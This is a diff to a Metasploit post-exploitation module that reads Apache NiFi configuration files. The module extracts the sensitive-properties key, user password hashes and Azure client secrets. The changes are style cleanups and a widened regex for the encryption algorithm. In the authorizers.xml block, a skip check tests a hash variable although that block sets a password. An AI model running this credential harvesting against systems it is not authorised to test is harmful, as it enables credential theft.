@@ -256,7 +256,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    unless ((flow_file && properties_file) || identity_file)
+    unless (flow_file && properties_file) || identity_file
       fail_with(Failure::NotFound, 'Unable to find login-identity-providers.xml, nifi.properties and/or flow.json.gz files')
     end
 
@@ -266,7 +266,10 @@ class MetasploitModule < Msf::Post
     key = properties.scan(/^nifi.sensitive.props.key=(.+)$/).flatten.first.strip
     fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if key.nil?
     print_good("Key: #{key}")
-    algorithm = properties.scan(/^nifi.sensitive.props.algorithm=(\w+)$/).flatten.first.strip
+    # https://rubular.com/r/N0w0WHTjjdKXHZ
+    # https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#property-encryption-algorithms
+    # https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#java-cryptography-extension-jce-limited-strength-jurisdiction-policies
+    algorithm = properties.scan(/^nifi.sensitive.props.algorithm=([\w-]+)$/).flatten.first.strip
     fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if algorithm.nil?
 
     columns = ['Name', 'Username', 'Password', 'Other Information']
@@ -333,7 +336,7 @@ class MetasploitModule < Msf::Post
         name = c.xpath('identifier').text
         username = c.xpath('property[@name="Username"]').text
         hash = c.xpath('property[@name="Password"]').text
-        next if (username.blank? || hash.blank?)
+        next if username.blank? || hash.blank?
 
         table << [name, username, hash, 'From login-identity-providers.xml']
 
@@ -363,7 +366,7 @@ class MetasploitModule < Msf::Post
         username = "Directory/Tenant ID: #{c.xpath('property[@name="Directory ID"]').text}" \
                    ", Application ID: #{c.xpath('property[@name="Application ID"]').text}"
         password = c.xpath('property[@name="Client Secret"]').text
-        next if (username.blank? || hash.blank?)
+        next if username.blank? || hash.blank?
 
         table << [name, username, password, 'From authorizers.xml']
       end
